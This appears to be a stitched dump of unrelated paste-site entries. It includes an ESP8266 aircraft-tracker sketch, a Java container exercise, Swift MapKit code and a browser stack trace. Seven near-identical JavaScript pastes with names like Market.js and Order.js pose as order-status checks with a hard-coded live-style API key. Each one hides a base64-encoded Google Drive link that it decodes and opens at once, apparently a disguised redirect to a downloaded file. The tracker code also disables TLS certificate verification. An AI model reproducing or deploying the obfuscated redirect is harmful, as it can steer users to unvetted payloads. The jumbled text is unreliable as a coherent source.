        padding: 0.2rem;
      }
      .track-button {
        width: 4.5rem;
      }
      input[type=""number""] {
        width: 3rem;
      }
      .api-status {
        bottom: 0.75rem;
        right: 0.75rem;
        font-size: 0.75rem;
      }
      .loading-spinner {
        width: 12px;
        height: 12px;
        border-width: 2px;
      }
    }
    @media (min-width: 600px) {
      .card {
        padding: 1.25rem;
      }
      .card-header {
        font-size: 1.125rem;
      }
      .data-grid {
        font-size: 1rem;
      }
      input[type=""number""], button {
        font-size: 1rem;
        padding: 0.375rem;
      }
      .api-status {
        bottom: 1.25rem;
        right: 1.25rem;
      }
    }
  </style>
</head>
<body>
  <div class=""card"">
    <div class=""card-header"">
      <span>Aircraft Tracker</span>
      <span id=""status-icon""></span>
    </div>
    <div class=""data-grid"" id=""aircraft-data"">
      <span class=""data-label"">Callsign:</span>
      <span class=""data-value"" id=""callsign"">N/A</span>
      <span class=""data-label"">Type:</span>
      <span class=""data-value"" id=""type"">N/A</span>
      <span class=""data-label"">Altitude:</span>
      <span class=""data-value"" id=""altitude"">0 ft</span>
      <span class=""data-label"">Speed:</span>
      <span class=""data-value"" id=""speed"">0 mph</span>
      <span class=""data-label"">Direction:</span>
      <span class=""data-value"" id=""direction"">0°</span>
      <span class=""data-label"">Distance:</span>
      <span class=""data-value"" id=""distance"">0 NM</span>
      <span class=""data-label"">Last Seen:</span>
      <span class=""data-value"" id=""seen"">0 s ago</span>
      <span class=""data-label"">Today:</span>
      <span class=""data-value"" id=""count"">0</span>
    </div>
    <div class=""settings"">
      <form id=""settings-form"">
        <div class=""settings-row"">
          <label for=""radius"">Radius (nm):</label>
          <input type=""number"" id=""radius"" name=""radius"" min=""1"" max=""50"" value=""%RADIUS%"">
          <button type=""submit"">Apply</button>
          <button type=""button"" id=""track-button"" class=""track-button"" disabled>Track</button>
        </div>
      </form>
      <div id=""status""></div>
    </div>
    <div class=""api-status"">
      <span class=""api-label"">API:</span>
      <span id=""loading-status""></span>
    </div>
  </div>
  <script>
    const statusIcon = document.getElementById('status-icon');
    const loadingStatus = document.getElementById('loading-status');

    function setLoadingState(isLoading) {
      if (isLoading) {
        loadingStatus.innerHTML = '<span class=""loading-spinner""></span>';
      } else {
        loadingStatus.innerHTML = '<span class=""success-icon"">✅</span>';
      }
    }

    function fetchData() {
      setLoadingState(true);

      fetch('/data')
        .then(response => response.json())
        .then(data => {
          setLoadingState(false);
          statusIcon.textContent = data.hasData ? '🛩️: Aircraft Detected' : '🚫 No Aircraft Detected';
          document.getElementById('callsign').textContent = data.callsign || 'N/A';
          document.getElementById('type').textContent = data.type || 'N/A';
          document.getElementById('altitude').textContent = data.altitude + ' ft';
          document.getElementById('speed').textContent = Math.round(data.speed * 1.15078) + ' mph';
          document.getElementById('direction').textContent = data.direction + '°';
          document.getElementById('distance').textContent = data.distance.toFixed(1) + ' NM';
          document.getElementById('seen').textContent = data.seen.toFixed(0) + ' s ago';
          document.getElementById('count').textContent = data.count;
          
          const trackButton = document.getElementById('track-button');
          if (data.hasData && data.hex && data.hex !== 'N/A') {
            trackButton.disabled = false;
            trackButton.onclick = () => {
              window.open(`https://globe.adsbexchange.com/?icao=${data.hex}`, '_blank');
            };
          } else {
            trackButton.disabled = true;
            trackButton.onclick = null;
          }
        })
        .catch(error => {
          setLoadingState(false);
          console.error('Error fetching data:', error);
        });
    }

    setInterval(fetchData, 2000);
    fetchData();

    document.getElementById('settings-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const radius = document.getElementById('radius').value;
      fetch('/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `radius=${radius}`
      })
      .then(response => response.text())
      .then(text => {
        document.getElementById('status').textContent = 'Settings updated';
        setTimeout(() => document.getElementById('status').textContent = '', 3000);
      })
      .catch(error => {
        document.getElementById('status').textContent = 'Error updating settings';
        console.error('Error:', error);
      });
    });
  </script>
</body>
</html>
)rawliteral"";
// Function to infer aircraft type
String getAircraftType(String model, String callsign) {
  model.toUpperCase();
  callsign.toUpperCase();
  String callsignPrefix = callsign.length() >= 3 ? callsign.substring(0, 3) : callsign;

  if (model.startsWith(""B737"") || model.startsWith(""B747"") || model.startsWith(""B757"") ||
      model.startsWith(""B767"") || model.startsWith(""B777"") || model.startsWith(""B787"") ||
      model.startsWith(""A220"") || model.startsWith(""A320"") || model.startsWith(""A330"") ||
      model.startsWith(""A350"") || model.startsWith(""A380"") || model.startsWith(""E170"") ||
      model.startsWith(""E190"") || model.startsWith(""CRJ"") || model.startsWith(""Q400"") ||
      model.startsWith(""ATR"") || model.startsWith(""B38M"")) {
    return ""Passenger"";
  }
  if (callsignPrefix == ""RYR"" || callsignPrefix == ""BAW"" || callsignPrefix == ""SHT"" ||
      callsignPrefix == ""EZY"" || callsignPrefix == ""EJU"" || callsignPrefix == ""EXS"" ||
      callsignPrefix == ""TOM"" || callsignPrefix == ""VIR"" || callsignPrefix == ""WUK"" ||
      callsignPrefix == ""LOG"" || callsignPrefix == ""AUR"" || callsignPrefix == ""UAL"" ||
      callsignPrefix == ""AAL"" || callsignPrefix == ""DAL"" || callsignPrefix == ""SWA"" ||
      callsignPrefix == ""QFA"" || callsignPrefix == ""ANZ"" || callsignPrefix == ""SIA"" ||
      callsignPrefix == ""JAL"" || callsignPrefix == ""CPA"" || callsignPrefix == ""UAE"" ||
      callsignPrefix == ""QTR"" || callsignPrefix == ""ETD"" || callsignPrefix == ""AFR"" ||
      callsignPrefix == ""DLH"" || callsignPrefix == ""EFW"" || callsignPrefix == ""KLM"" ||
      callsignPrefix == ""IBE"" || callsignPrefix == ""AZA"" || callsignPrefix == ""SWR"" ||
      callsignPrefix == ""THY"" || callsignPrefix == ""ETR"" || callsignPrefix == ""SAA"" ||
      callsignPrefix == ""KQA"" || callsignPrefix == ""TAM"" || callsignPrefix == ""ARG"" ||
      callsignPrefix == ""AVA"" || callsignPrefix == ""BCI"" || callsignPrefix == ""TAP"") {
    return ""Passenger"";
  }
  if (model.startsWith(""C130"") || model.startsWith(""C17"") || model.startsWith(""F16"") ||
      model.startsWith(""F18"") || model.startsWith(""F35"") || model.startsWith(""KC135"") ||
      model.startsWith(""H60"") || model.startsWith(""CH47"") || model.startsWith(""MQ9"") ||
      model.startsWith(""P8"") || model.startsWith(""A400"") || model.startsWith(""EUFI"") ||
      callsign.startsWith(""RRR"") || callsign.startsWith(""NAVY"") || callsign.startsWith(""ASCOT"") ||
      callsign.startsWith(""VANDAL"") || callsign.startsWith(""TARTAN"") ||
      callsignPrefix == ""RFR"" || callsignPrefix == ""NOH"" || callsignPrefix == ""KIN"" ||
      callsignPrefix == ""LCS"" || callsignPrefix == ""WAD"" || callsignPrefix == ""KRF"" ||
      callsignPrefix == ""KRH"" || callsignPrefix == ""NVY"" || callsignPrefix == ""AIO"" ||
      callsignPrefix == ""PAT"" || callsignPrefix == ""CNV"" || callsignPrefix == ""CGX"" ||
      callsignPrefix == ""RFF"" || callsignPrefix == ""CHD"" || callsignPrefix == ""TTF"" ||
      callsignPrefix == ""BRK"") {
    return ""Military"";
  }
  if (model.startsWith(""EC35"") || model.startsWith(""H135"") || model.startsWith(""EC45"") ||
      model.startsWith(""AS355"") || callsign.startsWith(""NPAS"") || callsign.indexOf(""POL"") >= 0) {
    return ""Police"";
  }
  if (model.startsWith(""BE20"") || model.startsWith(""PC12"") || model.startsWith(""EC45"") ||
      model.startsWith(""H145"") || callsign.indexOf(""MED"") >= 0 || callsign.indexOf(""AMB"") >= 0 ||
      callsign.startsWith(""HELI"") || callsign.indexOf(""AIRE"") >= 0 ||
      callsignPrefix == ""HLE"" || callsignPrefix == ""FLYDOC"" || callsign.startsWith(""MEDEVAC"") ||
      callsign.startsWith(""EVAC"") || callsign.startsWith(""HOSP"") || callsignPrefix == ""RED"") {
    return ""Ambulance"";
  }
  if (model.startsWith(""S92"") || model.startsWith(""AW189"") || callsign.startsWith(""G-"") ||
      callsign.indexOf(""RESCUE"") >= 0 || callsign.indexOf(""COAST"") >= 0 ||
      callsign.startsWith(""COASTGUARD"") || callsignPrefix == ""RES"") {
    return ""Coast Guard"";
  }
  if (model.startsWith(""B74F"") || model.startsWith(""B75F"") || model.startsWith(""AN12"") ||
      model.startsWith(""C130"") || callsign.indexOf(""FEDEX"") >= 0 || callsign.indexOf(""UPS"") >= 0 ||
      callsign.indexOf(""DHL"") >= 0 || callsignPrefix == ""GTI"") {
    return ""Cargo"";
  }
  if (model.startsWith(""GLF"") || model.startsWith(""CL60"") || model.startsWith(""C25"") ||
      model.startsWith(""LJ"") || model.startsWith(""F2TH"") || model.startsWith(""FA7X"")) {
    return ""Private Jet"";
  }
  if (model.startsWith(""C172"") || model.startsWith(""C152"") || model.startsWith(""P28A"") ||
      model.startsWith(""SR22"") || model.startsWith(""DA40"") || model.startsWith(""PA46"")) {
    return ""General"";
  }
  return ""Unknown"";
}

void setup() {
  // Initialize LED pin
  pinMode(LED_PIN, OUTPUT);
  analogWriteRange(1023);  // Set PWM range to 1023
  digitalWrite(LED_PIN, HIGH);  // Ensure LED is off (active-low)

  Serial.begin(115200);
  Serial.println(""Setup started..."");

  // Connect to WiFi
  Serial.println(""Connecting to WiFi..."");
  WiFi.begin(ssid, password);
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(""."");
    attempts++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println(""\nWiFi connected"");
    Serial.print(""IP Address: "");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println(""\nWiFi failed, restarting..."");
    delay(1000);
    ESP.restart();
  }

  // Setup web server routes
  server.on(""/"", HTTP_GET, []() {
    String page = htmlPage;
    page.replace(""%RADIUS%"", String(RADIUS));
    page.replace(""%STATUS_ICON%"", hasAircraftData ? ""🛫"" : ""—"");
    server.send(200, ""text/html"", page);
  });

  server.on(""/data"", HTTP_GET, []() {
    DynamicJsonDocument doc(256);
    doc[""hasData""] = hasAircraftData;
    doc[""callsign""] = currentCallsign;
    doc[""type""] = currentType;
    doc[""altitude""] = currentAlt;
    doc[""speed""] = currentSpeed;
    doc[""direction""] = currentDirection;
    doc[""distance""] = currentDistance;
    doc[""seen""] = seenTime;
    doc[""count""] = aircraftCount;
    doc[""hex""] = currentHex;
    String json;
    serializeJson(doc, json);
    server.send(200, ""application/json"", json);
  });

  server.on(""/settings"", HTTP_POST, []() {
    String response = ""Settings updated"";
    
    if (server.hasArg(""radius"")) {
      int newRadius = server.arg(""radius"").toInt();
      if (newRadius >= 1 && newRadius <= 50) {
        RADIUS = newRadius;
        Serial.println(""Radius updated to: "" + String(RADIUS));
      } else {
        response = ""Invalid radius value"";
        Serial.println(""Invalid radius: "" + server.arg(""radius""));
      }
    }
    
    server.send(200, ""text/plain"", response);
  });

  server.begin();
  Serial.println(""Web server started"");

  // Initialize reset time
  lastResetTime = millis();
}

void updateMainDisplay() {
  if (WiFi.status() != WL_CONNECTED) {
    hasAircraftData = false;
    return;
  }

  WiFiClientSecure client;
  client.setInsecure();
  HTTPClient http;
  Serial.println(""Fetching API data..."");

  char url[128];
  snprintf(url, sizeof(url), ""https://api.adsb.lol/v2/lat/%.4f/lon/%.4f/dist/%d"", LAT, LON, RADIUS);
  Serial.print(""URL: "");
  Serial.println(url);

  if (http.begin(client, url)) {
    int httpCode = http.GET();
    Serial.print(""HTTP Code: "");
    Serial.println(httpCode);

    if (httpCode == HTTP_CODE_OK) {
      WiFiClient *stream = http.getStreamPtr();
      StaticJsonDocument<200> filter;
      filter[""ac""][0][""flight""] = true;
      filter[""ac""][0][""alt_baro""] = true;
      filter[""ac""][0][""gs""] = true;
      filter[""ac""][0][""track""] = true;
      filter[""ac""][0][""lat""] = true;
      filter[""ac""][0][""lon""] = true;
      filter[""ac""][0][""seen""] = true;
      filter[""ac""][0][""t""] = true;
      filter[""ac""][0][""hex""] = true;

      DynamicJsonDocument doc(3072);
      DeserializationError error = deserializeJson(doc, *stream, DeserializationOption::Filter(filter));
      if (error) {
        Serial.println(F(""JSON parse error: "") + String(error.c_str()));
        hasAircraftData = false;
      } else {
        JsonArray aircraftList = doc[""ac""];
        if (aircraftList.size() > 0) {
          float min_distance = 9999.0;
          JsonObject closest_aircraft;
          for (JsonObject aircraft : aircraftList) {
            float aircraft_lat = aircraft[""lat""] | 0.0;
            float aircraft_lon = aircraft[""lon""] | 0.0;
            float delta_lat = aircraft_lat - LAT;
            float delta_lon = (aircraft_lon - LON) * cos(LAT * PI / 180.0);
            float distance = sqrt(delta_lat * delta_lat + delta_lon * delta_lon) * 60.0;
            if (distance < min_distance) {
              min_distance = distance;
              closest_aircraft = aircraft;
            }
          }

          String newCallsign = closest_aircraft[""flight""] | ""N/A"";
          newCallsign.trim();
          bool isUnique = true;
          for (int i = 0; i < seenCallsignsIndex; i++) {
            if (seenCallsigns[i] == newCallsign) {
              isUnique = false;
              break;
            }
          }
          if (isUnique && newCallsign != ""N/A"" && seenCallsignsIndex < 50) {
            seenCallsigns[seenCallsignsIndex++] = newCallsign;
            aircraftCount++;
            Serial.print(""New aircraft detected. Total today: "");
            Serial.println(aircraftCount);
          }

          currentCallsign = newCallsign;
          String aircraftModel = closest_aircraft[""t""] | ""Unknown"";
          currentType = getAircraftType(aircraftModel, currentCallsign);
          currentAlt = closest_aircraft[""alt_baro""] | 0;
          currentSpeed = closest_aircraft[""gs""] | 0.0;
          currentDirection = closest_aircraft[""track""] | 0.0;
          currentDistance = min_distance;
          float apiSeenTime = closest_aircraft[""seen""] | 0.0;
          currentHex = closest_aircraft[""hex""] | ""N/A"";

          lastDataTime = millis();
          initialSeenTime = apiSeenTime;
          seenTime = apiSeenTime;
          hasAircraftData = true;
          Serial.println(""Aircraft data updated"");
          Serial.print(""Free Heap: "");
          Serial.println(ESP.getFreeHeap());
        } else {
          Serial.println(""No aircraft found"");
          hasAircraftData = false;
          currentHex = ""N/A"";
        }
      }
    } else {
      hasAircraftData = false;
      currentHex = ""N/A"";
    }
    http.end();
  } else {
    hasAircraftData = false;
    currentHex = ""N/A"";
  }
}

void updateLED() {
  if (hasAircraftData) {
    // Fade in and out
    unsigned long currentTime = millis();
    if (currentTime - lastFadeUpdate >= FADE_INTERVAL) {
      if (fadeDirection) {
        fadeValue += 10;  // Increase brightness
        if (fadeValue >= 1023) {
          fadeValue = 1023;
          fadeDirection = false;
        }
      } else {
        fadeValue -= 10;  // Decrease brightness
        if (fadeValue <= 0) {
          fadeValue = 0;
          fadeDirection = true;
        }
      }
      // Apply PWM (invert for active-low LED)
      analogWrite(LED_PIN, 1023 - fadeValue);
      lastFadeUpdate = currentTime;
    }
  } else {
    // Turn LED off
    fadeValue = 0;
    digitalWrite(LED_PIN, HIGH);  // Active-low, so HIGH is off
  }
}

void loop() {
  server.handleClient();

  unsigned long currentTime = millis();

  // Reset counter if 24 hours have passed
  if (currentTime - lastResetTime >= DAY_LENGTH) {
    aircraftCount = 0;
    seenCallsignsIndex = 0;
    for (int i = 0; i < 50; i++) {
      seenCallsigns[i] = """";
    }
    lastResetTime = currentTime;
    Serial.println(""Daily aircraft counter reset"");
  }

  // Update seen time every second
  if (currentTime - lastUpdate >= 1000) {
    if (lastDataTime > 0) {
      seenTime = initialSeenTime + (currentTime - lastDataTime) / 1000.0;
    } else {
      seenTime = 0;
    }
  }

  // Update main data every 8 seconds
  if (currentTime - lastUpdate >= UPDATE_INTERVAL) {
    updateMainDisplay();
    lastUpdate = currentTime;
    Serial.println(""Main data updated"");
  }

  // Update LED state
  updateLED();
}"
RzAJWAUM,Untitled,zebmekey,JavaScript,Wednesday 16th of April 2025 11:13:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77921/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sKdsEcyS,[NP] Container,dzocesrce,Java,Wednesday 16th of April 2025 11:06:57 AM CDT,"import java.util.List;
import java.util.Scanner;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

public class Container<T extends Weightable> {

    List<T> elements;

    public Container() {
        this.elements= new ArrayList<>();
    }

    public double getTotalWeight(){
        return elements.stream().mapToDouble(i->i.getWeight()).sum();
    }

    public void addElement(T elem){
        elements.add(elem);
    }

    public List<T> lighterThan(T elem){
        return elements.stream().filter(i->i.getWeight()<elem.getWeight())
                .collect(Collectors.toList());
    }

    public List<T> between(T a, T b){
        return elements.stream().filter(i->i.getWeight()>a.getWeight()&&i.getWeight()<b.getWeight())
                .collect(Collectors.toList());
    }

    public boolean compare(Container<? extends Weightable> container){
        return this.getTotalWeight()>container.getTotalWeight();
    }


}
public interface Weightable<T> extends Comparable<Weightable<T>> {

    double getWeight();
}
public class WeightableString implements Weightable<WeightableString> {

    private String word;

    public WeightableString(String word) {
        this.word = word;
    }


    @Override
    public double getWeight(){
        return word.length();
    }


    @Override
    public int compareTo(Weightable o) {
        return (int)Double.compare(this.getWeight(),o.getWeight());
    }
}
public class WeightableDouble implements Weightable<WeightableDouble>{

    private double weight;

    public WeightableDouble(double weight) {
        this.weight = weight;
    }

    @Override
    public int compareTo(Weightable o) {
        return (int)Double.compare(this.getWeight(),o.getWeight());
    }

    @Override
    public double getWeight(){
        return weight;
    }

}

public class ContainerTest {
    public static void main(String[] args) {

        Container<WeightableDouble> container1 = new Container<>();
        Container<WeightableDouble> container2 = new Container<>();
        Container<WeightableString> container3 = new Container<>();
        Scanner sc = new Scanner(System.in);
        int n = sc.nextInt();
        int m = sc.nextInt();
        int p = sc.nextInt();
        double a = sc.nextDouble();
        double b = sc.nextDouble();
        WeightableDouble wa = new WeightableDouble(a);
        WeightableDouble wb = new WeightableDouble(b);

        for(int i=0;i<n;i++){
            double weight = sc.nextDouble();
            container1.addElement(new WeightableDouble(weight));
        }
        for(int i=0;i<m;i++){
            double weight = sc.nextDouble();
            container2.addElement(new WeightableDouble(weight));
        }
        for(int i=0;i<p;i++){
            String s = sc.next();
            container3.addElement(new WeightableString(s));
        }
        List<WeightableDouble> resultSmaller = container1.lighterThan(wa);
        List<WeightableDouble> resultBetween = container1.between(wa,wb);
        System.out.println(""Lighter than ""+wa.getWeight()+""!"");
        for(WeightableDouble wd : resultSmaller){
            System.out.println(wd.getWeight());
        }
        System.out.println(""Between ""+wa.getWeight()+"" and ""+wb.getWeight()+""!"");
        for(WeightableDouble wd : resultBetween){
            System.out.println(wd.getWeight());
        }
        System.out.println(""Comparison: "");
        System.out.println(container1.compare(container2));
        System.out.println(container1.compare(container3));

    }
}"
gynN9eDi,Market.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 10:57:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42769/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BxCxAwnH,Untitled,SpawnKz,JavaScript,Wednesday 16th of April 2025 10:42:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VP3UVYYc,js.errors,mrl4n,Java,Wednesday 16th of April 2025 10:32:43 AM CDT,"at blocks-lottie.js?ver=41f166c04cc68629dd28:1:47988
    at blocks-lottie.js?ver=41f166c04cc68629dd28:1:48003
    at __decorate (blocks-lottie.js?ver=41f166c04cc68629dd28:1:27063)
    at 8239 (blocks-lottie.js?ver=41f166c04cc68629dd28:1:388912)
    at __webpack_require__ (blocks-lottie.js?ver=41f166c04cc68629dd28:1:407106)
    at 247 (blocks-lottie.js?ver=41f166c04cc68629dd28:1:390703)
    at __webpack_require__ (blocks-lottie.js?ver=41f166c04cc68629dd28:1:407106)
    at blocks-lottie.js?ver=41f166c04cc68629dd28:1:408733
    at __webpack_require__.O (blocks-lottie.js?ver=41f166c04cc68629dd28:1:407530)
    at blocks-lottie.js?ver=41f166c04cc68629dd28:1:408800
react-dom.min.js?ver=18.3.1.1:10 TypeError: Cannot read properties of null (reading 'toString')
    at pL (components.min.js?ve…a09b31e37:33:143126)
    at n (components.min.js?ve…a09b31e37:33:146597)
    at t.get (components.min.js?ve…a09b31e37:33:146758)
    at t.render (components.min.js?ve…a09b31e37:33:155778)
    at br (react-dom.min.js?ver=18.3.1.1:10:59457)
    at yr (react-dom.min.js?ver=18.3.1.1:10:59255)
    at Qs (react-dom.min.js?ver=18.3.1.1:10:121487)
    at wl (react-dom.min.js?ver=18.3.1.1:10:88637)
    at bl (react-dom.min.js?ver=18.3.1.1:10:88565)
    at yl (react-dom.min.js?ver=18.3.1.1:10:88428)"
nTjhcN5M,Products.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 10:26:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R07BHRPL,Order.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 10:11:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53165/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ivJ10Ezx,EXTERNAL_THEORY_CODE,stronk_8s,Swift,Wednesday 16th of April 2025 10:07:39 AM CDT,"//Code for MapKitView and Location based call out

import UIKit
import MapKit

class ViewController: UIViewController {
    @IBOutlet var mapView: MKMapView!
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        // setup the map's location and zoom factor
        let lattitude = 21.1702
        let longitude = 72.8311
        var mapRegion:MKCoordinateRegion = MKCoordinateRegion();
        mapRegion.center.latitude = lattitude;
        mapRegion.center.longitude = longitude;
        mapRegion.span.latitudeDelta = 0.5;
        mapRegion.span.longitudeDelta = 0.5;
        mapView.setRegion(mapRegion, animated: true)
        //For creating pin point (CallOut)
        let ant = MKPointAnnotation()
        ant.title=""Where am I?....""
        ant.subtitle=""I am at VNSGU....""
        ant.coordinate = CLLocationCoordinate2D(latitude: lattitude, longitude: longitude)
        mapView.addAnnotation(ant)
    }
}


//Code for Auto layout Constraint Animation

import UIKit
class ViewController: UIViewController {
    @IBOutlet var imageViewAni: UIImageView!
    var leftAnchor:NSLayoutConstraint?
    var rightAnchor:NSLayoutConstraint?
    //var topAnchor: NSLayoutConstraint?
    //var bottomAnchor: NSLayoutConstraint?
    // var widthAnchor: NSLayoutConstraint?
    //var heightAnchor: NSLayoutConstraint?
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        imageViewAni.translatesAutoresizingMaskIntoConstraints = false
        imageViewAni.isUserInteractionEnabled = true
        imageViewAni.addGestureRecognizer(UITapGestureRecognizer(target: self, action: #selector(animate)))
        leftAnchor = imageViewAni.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor)
        leftAnchor?.isActive = true
        //topAnchor = imageViewAni.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor)
        //topAnchor?.isActive = true
        rightAnchor = imageViewAni.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor)
        //bottomAnchor = imageViewAni.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
        //steveJobsImageView.leftAnchor.constraint(equalTo: view.leftAnchor).isActive = true
        /*widthAnchor = imageViewAni.widthAnchor.constraint(equalToConstant: 100)
        widthAnchor?.isActive = true
        heightAnchor = imageViewAni.heightAnchor.constraint(equalToConstant: 100)
        heightAnchor?.isActive = true*/
    }
    @objc func animate(){
        print(""Image is tapped"")
        //animation code
        //topAnchor?.isActive = false
        leftAnchor?.isActive = false
        rightAnchor?.isActive = true
        /*bottomAnchor?.isActive = true
         rightAnchor?.constant = -16
         widthAnchor?.constant = 900
         heightAnchor?.constant = 200*/
        UIView.animate(withDuration: 0.5, delay: 0, usingSpringWithDamping:1, initialSpringVelocity: 1,options: .curveEaseOut,animations: {
            self.view.layoutIfNeeded()
            //self.imageViewAni?.frame = CGRect(x:200,y:0,width: 50,height: 50)
        },completion: nil)
    }
}"
yxwFV41c,Market.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 09:55:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05228/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

